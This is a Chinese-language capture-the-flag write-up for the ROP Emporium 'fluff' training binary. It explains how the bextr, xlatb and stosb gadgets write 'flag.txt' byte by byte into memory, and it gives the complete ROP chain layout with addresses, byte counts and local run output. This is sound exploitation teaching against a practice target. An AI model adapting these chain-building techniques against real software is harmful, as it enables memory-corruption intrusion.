# 34 ROP Emporium `fluff` 速通笔记

```text
64 位 ELF、No PIE、NX、无 canary、Partial RELRO、not stripped
print_file 在配套 libfluff.so 里（RUNPATH = b'.'），flag.txt 就在同目录
bss 特别小：.bss = 0x601038，只有 8 字节；可写段到 0x601040 结束
```

## 1. 为什么和 32 分开记（同族、不同原语）

| | 32 `badchars` | 34 `fluff` |
| --- | --- | --- |
| 约束来源 | 输入被**过滤器**扫描（`x g a .` 命中就改成 `0xeb`） | 二进制里**没有写内存原语** |
| 解法 | 写密文 + `xor byte [r15], r14b` 原地解码 | `bextr` 构地址 + `xlatb` 取字符 + `stosb` 落盘 |

共同点：都属于"**能写的东西和需要写的东西之间隔了一层**"，识别时要一起想。

## 2. 唯一可用的三个 gadget（`questionableGadgets`）

| 地址 | gadget | 作用 |
| --- | --- | --- |
| `0x400628` | `xlatb ; ret` | `al = [rbx + al]`（查表） |
| `0x40062a` | `pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret` | 把任意 32 位值放进 `rbx` |
| `0x400639` | `stosb ; ret` | `[rdi] = al ; rdi++` |
| `0x4006a3` | `pop rdi ; ret` | 设写入起点 / 传参 |
| `0x400510` | `print_file@plt` | |

**没有** `pop rax`、没有 `pop rbx`、没有 `mov [reg], reg`、没有 mem-arithmetic。
`ROP().find_gadget` 在这类题上容易漏，仍建议 `objdump -d` + `ROPgadget` 双查。

## 3. 原理：bextr 打包地址

`bextr dst, src, ctrl`：`dst = (src >> (ctrl & 0xff)) & ((1 << ((ctrl >> 8) & 0xff)) - 1)`。

gadget 自带 `add rcx, 0x3ef2`，所以

```text
ctrl(rdx) = 0x2000          -> start = 0, len = 32
rbx = ((rcx + 0x3ef2) >> 0) & 0xffffffff = rcx + 0x3ef2  (mod 2^32)
```

即 **rbx 完全可控**（`rcx` 来自栈上的 8 字节 pop）。

## 4. 逐字符构造："al 就是上一个写的字符"

对每个目标字符 `c`：

1. 在二进制的可读段里找任意地址 `A` 满足 `[A] == c`（EXP 用 `ELF.segments` 自动扫）；
2. `rbx = A - al_prev`；
3. `xlatb` → `al = [A - al_prev + al_prev] = [A] = c`；
4. `stosb` → 写入 `.bss`，`rdi++`。

`al_prev` 是链式传播的（上一个字符）；**只有第一个字符**需要外部确定，它等于
`pwnme()` 最后那句 `puts("Thank you!")` 的返回值。本机 glibc 实测 **11**：

```bash
printf '#include <stdio.h>\nint main(){printf("%d\n",puts("Thank you!"));}' > /tmp/p.c
gcc -o /tmp/p /tmp/p.c && /tmp/p     # 11
```

EXP 用 `AL0` 环境变量覆盖（`AL0=11 python 34_…_exp.py LOCAL`）。

> **为什么不能"先把 al 清零"**：`xlatb` 需要 `[rbx + al]` 落在可读内存里。`fluff` 的
> `.bss` 只有 8 字节，没有 ≥256 字节的连续零区；`al0 = 11` 时 `0x601038 + 11 = 0x601043`
> 虽然同页可写，但值不保证为 0。所以"清零归一化"这条路走不通，必须拿到真实的 `al0`。

## 5. 写目标选 0x601040

- `.bss` 只有 `0x601038..0x60103f` 8 字节，写 `"flag.txt"`（9 字节含 `\0`）会越界；
- `0x601040` 起是 `PT_LOAD`（`0x600df0` + memsz `0x250`）的**零填充尾巴**，同页可写，
  且天然是 `\0`，正好当字符串结尾；
- 不碰 `.got.plt`（`0x601000..0x601037`），不碰 `.bss` 全局变量。

## 6. 利用链（400 B，`read` 上限 0x200）

```text
'A' * 40                                     # read(0, rbp-0x20, 0x200)
pop rdi ; ret                                # 0x4006a3
  0x601040                                   #   rdi = 写入起点
# 对 "flag.txt" 的 8 个字符，每个 5 格（40 B）：
pop rdx ; pop rcx ; add rcx,0x3ef2 ; bextr rbx,rcx,rdx ; ret   # 0x40062a
  0x2000                                     #   rdx: start=0, len=32
  (A - al_prev - 0x3ef2) & 0xffffffff        #   rcx
xlatb ; ret                                  # 0x400628  al = [A]
stosb ; ret                                  # 0x400639  [rdi] = al, rdi++
pop rdi ; ret                                # 0x4006a3
  0x601040
print_file@plt                               # 0x400510
```

长度账：`40 + 16 + 8×40 + 24 = 400`，离 512 还有 112 字节余量。

## 7. 本地复现

```bash
cd '/home/yfhd5/Pwn_Writeups/badchars_encoding'
source ../.venv/bin/activate
python 34_ropemporium_fluff_exp.py LOCAL
# Thank you!
# ROPE{a_placeholder_32byte_flag!}
# [+] fluff OK（chain=400B, al0=11）
```

远程用 `HOST=… PORT=… python 34_ropemporium_fluff_exp.py`（官方无公开靶机）。
链跑完进程会 `SIGSEGV`（栈已破），EXP 已 `RLIMIT_CORE=0`，不会留 `core.*`。

附件来源：`https://ropemporium.com/binary/fluff.zip`（zip sha256 `a2d3ab1d…`），
原始 zip 在 `_vendor/ropemporium/fluff.zip`。

## 8. 识别卡

```text
有 xlatb/stosb/bextr，却没有 mov [reg], reg
  -> bextr 把目标地址算进 rbx，xlatb 拿字符，stosb 写出
al 是"上一次写的字符"，链式可控；第一个字符的 al 来自上一条无关指令的返回值（要实测）
先看 .bss 够不够大：没有零区就不能做"清零归一化"
写目标挑段的零填充尾巴，别踩 .got.plt / 全局变量
```
